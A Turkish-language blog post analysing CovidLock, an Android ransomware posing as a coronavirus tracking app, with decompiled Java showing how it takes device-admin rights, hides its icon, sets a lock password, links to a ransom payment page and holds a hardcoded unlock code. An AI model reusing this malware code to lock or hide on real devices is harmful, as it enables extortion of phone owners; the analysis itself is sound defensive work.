---
layout: post
title: Covidlock - Coronavirus İzleme Uygulaması Analizi
tags: ["corona", "virus", "mobile", "malware", "zararlı yazılım", "android", "uygulama", "covidlock"]
---

Merhaba,

Uzun bir aradan sonra yeni bir blog yazısıyla karşınızdayım.

## Giriş

Corona (nCoV-19, 2019-nCoV, korona) virüsü tüm dünyanın gündeminde olduğu için, zararlı yazılım geliştiren kötü niyetli hackerlar da hedef olarak coronayı seçmişler. coronavirusapp[.]site diye website açıp, apk'yı da site üzerinden yayınlamışlar. Girişi okuduğuna göre artık bir sonraki adıma geçebiliriz.

## Ön İnceleme

Uygulamanın apksını kendi sitesinden download apk'ya basıp indirebilirsiniz. Hazırsan, jadx-gui'yi açıp apk dosyamızı seçelim. Sonrasında MainActivity'nin nerede olduğunu öğrenmek için AndroidManifest.xml'e girip kodlara bir bakalım.

```java
        <activity android:name="com.device.security.activities.MainActivity" android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
```
MainActivity'nin nerede olduğunu öğrendik, şimdi websitedeki ekran görüntülerine bakalım.


<img src="/assets/img/corona-landing.png" alt="coronavirus app landing" border="0">
&nbsp;

Güya bizi böyle bir arayüz karşılıyor ama gerçek arayüze bakalım 😏

<img src="/assets/img/corona-main.png" alt="coronavirus app main" border="0" copyright="DomainTools">
&nbsp;

Uygulama bizden erişilebilirlik ve kilit ekranını etkinleştirme ayarlarına izin vermemizi istiyor. Peki bu izinleri verdiğimizde ne oluyor? O zaman Reverse Time 🔧🔨⚡

## Reverse Time 💻

MainActivity'nin nerede olduğunu görmüştük diğer aktivitelere de bakalım.

<img src="/assets/img/corona-activities.png" alt="coronavirus app landing" border="0">
&nbsp;

> * BlockedAppActivity
> * MainActivity
> * StartServiceActivity

Bizleri karşılıyor. MainActivity'e geri dönüp kodları biraz inceleyelim.

```java
package com.device.security.activities;

import android.app.Activity;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import com.device.security.R;
import com.device.security.receiver.ActivateDeviceAdminReceiver;
import com.device.security.util.SharedPreferencesUtil;
import com.device.security.util.Util;

public class MainActivity extends AppCompatActivity {
    private static final int ADMIN_REQUEST_CODE_ = 1000;
    private static final int REQUEST_BATTERY_OPTIMIZATION = 101;
    private static final int REQUEST_PERMISSION = 100;
    private static final String TAG = MainActivity.class.getName();
    static String[] permissions = {"android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.RECEIVE_BOOT_COMPLETED"};
    @BindView(2131165223)
    Button accessibilityButton;
    @BindView(2131165267)
    Button deviceAdminButton;
    @BindView(2131165282)
    Button hideAppButton;
    @BindView(2131165292)
    ImageView imgAccessibilityPermission;
    @BindView(2131165293)
    ImageView imgDeviceAdmin;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView((int) R.layout.activity_main);
        ButterKnife.bind((Activity) this);
        if (Build.VERSION.SDK_INT >= 23) {
            requestBatteryOptimization();
        }
    }

    private void requestBatteryOptimization() {
        try {
            String packageName = getPackageName();
            PowerManager powerManager = (PowerManager) getSystemService("power");
            if (powerManager == null || powerManager.isIgnoringBatteryOptimizations(packageName)) {
                requestRunTimePermissions();
                return;
            }
            Intent intent = new Intent();
            intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
            intent.setData(Uri.parse("package:" + packageName));
            startActivityForResult(intent, 101);
        } catch (Exception e) {
            e.getMessage();
        }
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 1000 && i2 == -1) {
            this.imgDeviceAdmin.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
        } else if (i2 == 0 && i == 101) {
            requestBatteryOptimization();
        } else if (i2 == -1 && i == 101) {
            requestRunTimePermissions();
        }
    }

    /* access modifiers changed from: package-private */
    @OnClick({2131165267})
    public void onDeviceAdminRequest() {
        if (!Util.isEnabledAsDeviceAdministrator()) {
            deviceAdministratorRequest();
        } else {
            Toast.makeText(getApplicationContext(), "Already Active as Device Admin", 1).show();
        }
    }

    /* access modifiers changed from: protected */
    public void onResume() {
        super.onResume();
        if (Util.isAccessibilityEnabled(this)) {
            this.imgAccessibilityPermission.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
        }
        if (Util.isEnabledAsDeviceAdministrator()) {
            this.imgDeviceAdmin.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
        }
    }

    /* access modifiers changed from: package-private */
    @OnClick({2131165223})
    public void onAccessibilityPermissionRequest() {
        if (!Util.isAccessibilityEnabled(this)) {
            startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
        } else {
            Toast.makeText(getApplicationContext(), "Permission Already Granted.", 1).show();
        }
    }

    /* access modifiers changed from: package-private */
    @OnClick({2131165282})
    public void onHideApp() {
        if (!Util.isEnabledAsDeviceAdministrator() || !Util.isAccessibilityEnabled(this)) {
            Toast.makeText(this, "Please Grant All Permissions", 0).show();
            return;
        }
        Util.startService(this);
        Util.hideAppIcon(this, getPackageName(), "com.device.security.activities.MainActivity");
        SharedPreferencesUtil.setAppAsHidden(this, true);
        finish();
    }

    private void deviceAdministratorRequest() {
        ComponentName componentName = new ComponentName(this, ActivateDeviceAdminReceiver.class);
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.action.SET_NEW_PASSWORD", componentName);
        intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
        startActivityForResult(intent, 1000);
    }

    private void requestRunTimePermissions() {
        if (checkSelfPermission(permissions[0]) != 0 || checkSelfPermission(permissions[1]) != 0 || checkSelfPermission(permissions[2]) != 0) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[0]) || ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[1]) || ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[2])) {
                displayPermissionRequestDialog();
            } else {
                ActivityCompat.requestPermissions(this, permissions, 100);
            }
        }
    }

    public int checkSelfPermission(String str) {
        return ActivityCompat.checkSelfPermission(this, str);
    }

    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 100) {
            int length = iArr.length;
            int i2 = 0;
            boolean z = false;
            while (true) {
                if (i2 < length) {
                    if (iArr[i2] != 0) {
                        z = false;
                        break;
                    } else {
                        i2++;
                        z = true;
                    }
                } else {
                    break;
                }
            }
            if (z) {
                Log.d(TAG, "All Permissions Granted.");
            } else if (ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[0]) || ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[1]) || ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[2])) {
                displayPermissionRequestDialog();
            }
        }
    }

    private void displayPermissionRequestDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle((CharSequence) "Need Permissions");
        builder.setMessage((CharSequence) "Designius App need Multiple Permissions.\nPlease Grant.");
        builder.setPositiveButton((CharSequence) "Grant", (DialogInterface.OnClickListener) new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.cancel();
                ActivityCompat.requestPermissions(MainActivity.this, MainActivity.permissions, 100);
            }
        });
        builder.setNegativeButton((CharSequence) "Cancel", (DialogInterface.OnClickListener) new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.cancel();
            }
        });
        builder.setCancelable(false);
        builder.show();
    }
}
```

Burada bizi ilgilendiren kısım 155.ci satırdaki deviceAdministratorRequest fonksiyonu.

```java
  private void deviceAdministratorRequest() {
      ComponentName componentName = new ComponentName(this, ActivateDeviceAdminReceiver.class);
      Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
      intent.putExtra("android.app.action.SET_NEW_PASSWORD", componentName);
      intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
      startActivityForResult(intent, 1000);
  }
```

Uygulama Device Admin izniyle kilit şifresi koyuyor ve kendini device admin olarak ekliyor.

Peki uygulamanın istediği izinleri verdiğimizde cihazda ne oluyor?

<img src="/assets/img/corona-ransomware.png" alt="coronavirus app ransomware" border="0" copyright="DomainTools">
&nbsp;


Kısaca telefonunuz şifrelendi ve 48 saat içinde 100 dolar bitcoin ödemezseniz her şey silinecek diyor. Hadi bu ekranın kaynak koduna bakalım.

BlockedAppActivity'e giriyoruz ve onCreate fonksiyonuna bakıyoruz.

```java
public /* synthetic */ void lambda$onCreate$2$BlockedAppActivity(View view) {
       Intent intent = new Intent("android.intent.action.VIEW", Uri.parse("hxxps://qmjy6.bemobtracks.com/go/ff06aca3-21c7-4619-b27a-6bae0db6722b"));
       intent.addFlags(268435456);
       List<String> allBrowsersList = Util.getAllBrowsersList(this);
       if (allBrowsersList.size() > 0) {
           try {
               intent.setPackage(allBrowsersList.get(0));
               startActivity(intent);
           } catch (ActivityNotFoundException e) {
               e.printStackTrace();
           }
       } else {
           Toast.makeText(this, "No Browser App Found", 1).show();
       }
   }

```

Uygulama cihazda varsayılan tarayıcıyla `hxxps://qmjy6.bemobtracks.com/go/ff06aca3-21c7-4619-b27a-6bae0db6722b` linkini açıyor ve https://pastebin.com/GK8qrfaC linkine gidiyor. Pastebin'de nasıl ödeme yapacağınız anlatılmış.

## Biraz Eğlenelim

Şimdi işin komik tarafına gelelim 🙂

BlockedAppActivity'de 76. satırdaki verifyPin fonksiyonuna bakıyoruz ve boom 💥

```java
private void verifyPin() {
        String trim = this.secretPin.getText().toString().trim();
        if (TextUtils.isEmpty(trim)) {
            Toast.makeText(this, "enter decryption code", 0).show();
        }
        if (trim.equals("4865083501")) {
            SharedPreferencesUtil.setAuthorizedUser(this, "1");
            Toast.makeText(this, "Congrats. You Phone is Decrypted", 0).show();
            finish();
            return;
        }
        Toast.makeText(this, "Failed, Decryption Code is Incorrect", 0).show();
    }
```

Uygulamayı yapan eleman decrypt şifresini kodunun içine açık bir şekilde koymuş 🤣


## Son

Yazıyı buraya kadar okuduğunuz için teşekkür ederim 😃

Twitter'dan bu yazının linki attığım tweeti retweetlerseniz mutlu olurum 😄



## Kaynaklar

https://www.domaintools.com/resources/blog/covidlock-mobile-coronavirus-tracking-app-coughs-up-ransomware (Uygulamanın cihazdaki resimleri bu siteden alındı ve bu yazıyı yazmama vesile oldu)

https://github.com/skylot/jadx (yazıda bahsi geçen jadx-gui aracı)
